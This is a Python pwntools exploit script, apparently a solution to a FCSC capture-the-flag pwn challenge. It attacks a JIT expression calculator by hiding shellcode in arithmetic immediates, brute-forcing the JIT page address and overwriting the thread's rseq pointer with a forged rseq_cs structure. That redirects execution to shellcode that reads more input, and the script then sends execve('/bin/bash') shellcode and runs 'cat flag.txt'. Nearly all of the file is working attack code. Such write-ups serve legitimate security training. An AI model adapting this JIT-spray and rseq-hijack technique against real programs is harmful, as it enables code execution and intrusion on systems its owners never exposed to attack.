#!/usr/bin/python3

from pwn import *


HOST = "chall.fcsc.fr"
PORT = 2111

vuln = ELF("./patched")
context.binary = vuln

libc = ELF("./libc-2.41.so")

RSEQ_SIG  = 0x53053053
JIT_PAGE_SIZE = (1 << 16)
TLS_PAGE_SIZE = 0x3000
RSEQ_OFFSET = 0x680
LIBC_TEXT_OFFSET = 0x28000

def start():
    global p, jit_page
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.DOCKER:
        p = remote("localhost", 4000)
    else:
        p = process("./patched")

def get_jit_page():
    p.recvuntil(b"@ 0x")
    jit_page = int(p.recvline(keepends=False).decode(), 16)
    info(f"JIT page @ {jit_page:#x}")
    return jit_page


def poc_large_input(count):
    start()
    get_jit_page()
    pause()
    payload = b'1+(' * count
    payload += b"1"
    payload += b")" * count
    p.sendline(payload)
    p.interactive()

#poc_large_input(0x3000)


"""
0:  31 ff                   xor    edi,edi
2:  31 d2                   xor    edx,edx
4:  66 ba 00 02             mov    dx,0x200
8:  e8 00 00 00 00          call   d <next>
000000000000000d <next>:
d:  5e                      pop    rsi
e:  31 c0                   xor    eax,eax
10: 0f 05                   syscall
"""
def build_shellcode_immediates():

    #jump over push rax and prefix of next movabs
    sheep_jump = b"\xeb\x03"

    sc_chunks = [
        p32(RSEQ_SIG) + b"\x31\xff", #xor edi, edi
        b"\x31\xd2" + b"\x66\xba\x00\x02", #xor edx, edx; mov dx, 0x200
        b"\xe8\x00\x00\x00\x00" + b"\x5e", #call 0; pop rsi 
        b"\x31\xc0" + b"\x0f\x05" + b"\x90\x90", #xor eax, eax, syscall
    ]
    numbers = []
    for chunk in sc_chunks:
        assert len(chunk) == 6
        chunk += sheep_jump
        numbers.append(u64(chunk))

    
    payload = b""
    for i in range(len(numbers) - 1):
        n = numbers[i]
        payload += b"(" + str(n).encode() + b"+"
    payload += str(numbers[-1]).encode()
    payload += (len(numbers) - 1)*b")"
    return payload

#print(build_shellcode_immediates())


WALK_8 = b"+1"
WALK_11 = b"+128"
WALK_17 = b"+2147483648"

def stride(distance:int):
    assert distance%8 == 0
    return (distance//8)*WALK_8

def build_rseq_cs(start_ip, abort_ip):
    """
    builds the fake rseq_cs
    assumes offset+5 is aligned
    """
    version_flags = u64(b"\0"*7 + b"\x80")
    abort_ip_part = (abort_ip>> 8)&0xffffffff
    if abort_ip_part & 0x80000000:
        abort_ip_part |= 0xffffffff00000000

    payload = f"({version_flags} + ({start_ip} + (1 + ({0x100} + ({abort_ip_part} + {0x10000})))))".encode()
    return payload

#we want addresses in the form 0xXXb848XXX000
def bf_start():
    start()
    jit_page = get_jit_page()
    bf_part = (jit_page >> 24)&0xffff
    info(f"bfpart : {bf_part:#x}")
    while  bf_part!= 0xB848:
        info(f"Bad settings, trying again...")
        p.sendline(b"clear")
        jit_page = get_jit_page()
        bf_part = (jit_page >> 24)&0xffff
        info(f"bfpart : {bf_part:#x}")
    return jit_page
    


def attack_rseq_not_working():

    jit_page = bf_start()


    tls_addr = jit_page + JIT_PAGE_SIZE
    libc.address = tls_addr + TLS_PAGE_SIZE
    info(f"Libc @ {libc.address:#x}")

    shellcode_addr = jit_page + 0x168


    payload = b""
    #align stack
    payload += b"1+1"
    payload += WALK_17
    # 0x1b
    #put req_cs here
    payload += b"+"
    payload +=  build_rseq_cs(libc.address + LIBC_TEXT_OFFSET, shellcode_addr)
    rseq_cs_addr = jit_page + 0x20
    #0x66
    #align stack
    payload += WALK_11 + WALK_17
    #0x82
    #reach shellcode offset
    payload += stride(0x168 - 0x82-6)
    #0x162
    #add shellcode at 0x168
    payload += b"+"
    payload += build_shellcode_immediates()
    #0x1a6

    #align
    payload += WALK_11*2 + WALK_17*2
    #offset 0x1de
    #reach end of jit
    payload += stride(JIT_PAGE_SIZE -2 - 0x1de)
    #reach rseq
    payload += stride(RSEQ_OFFSET + 8)
    #overwrite address
    payload += f"+{rseq_cs_addr}".encode()

    
    p.sendline(payload)
    p.recvuntil(b"procedure\n")
    shellcode = b"\x90"*0x30 + asm(shellcraft.execve("/bin/bash"))
    p.sendline(shellcode)
    p.sendline(b"ls")
    p.sendline(b"cat flag.txt")
    p.interactive()

def build_rseq_payload(rseq_cs_addr:int):
    """
    assume addr is 0x686, right before rseq_cs
    """
    #assert (rseq_cs_addr >> 0x24) & 0xffff == 0x48B8
    low = (rseq_cs_addr & 0xffffff)
    low_part = low << 8
    if low_part & 0x80000000:
        low_part |= 0xffffffff00000000
    
    high = (rseq_cs_addr) >> (8*5)
    assert high&0xff == high

    payload = f"({low_part} + {high | 0x100000000000000})".encode()
    return payload

def attack_rseq(bf=True):

    if bf:
        jit_page = bf_start()
    else:
        start()
        jit_page = get_jit_page()


    tls_addr = jit_page + JIT_PAGE_SIZE
    libc.address = tls_addr + TLS_PAGE_SIZE
    info(f"Libc @ {libc.address:#x}")

    shellcode_addr = jit_page + 6

    mmaped_input = jit_page - 0x21000
    input_buffer = mmaped_input + 0x10

    rseq_cs_offset = 0x4800
    rseq_cs_addr = input_buffer + rseq_cs_offset

    info(f"rseq_cs @ {rseq_cs_addr:#x}")

    #payload size to make sure the getline buffer is mmaped at the right location
    payload_size = (0x20000-0x1000)

    payload = b""
    #place shellcode at the beginning
    payload += build_shellcode_immediates()
    #3e
    #align stack
    payload += WALK_11*2 + WALK_17*2
    #0x76
    
    
    #reach end of jit
    payload += stride(JIT_PAGE_SIZE -2 - 0x76)
    
    #reach rseq
    payload += stride(RSEQ_OFFSET+8)
    #overwrite address
    payload += b"+"
    payload += build_rseq_payload(rseq_cs_addr)
    #terminate jit compilation
    payload += b"\0"
    #pad to addr of rseq_cs
    payload += (rseq_cs_offset - len(payload))*b"A"
    #rseq_cs
    payload += p32(0) #version
    payload += p32(0) #flags
    payload += p64(libc.address + LIBC_TEXT_OFFSET) #start_ip
    payload += p64(0x1000000000) #post_commit_offset
    payload += p64(shellcode_addr) #abort_ip
    #fill to size
    payload += (payload_size - len(payload))*b"B"
    


    p.sendline(payload)
    p.recvuntil(b"procedure\n")
    sleep(3)
    
    
    shellcode = b"\x90"*0x30 + asm(shellcraft.execve("/bin/bash"))
    p.sendline(shellcode)
    p.sendline(b"ls")
    p.sendline(b"cat flag.txt")
    
    
    p.interactive()

def test_mmap():
    start()
    get_jit_page()
    pause()
    payload = (0x20000-0x1000)*b"\0"
    p.sendline(payload)
    p.interactive()

attack_rseq()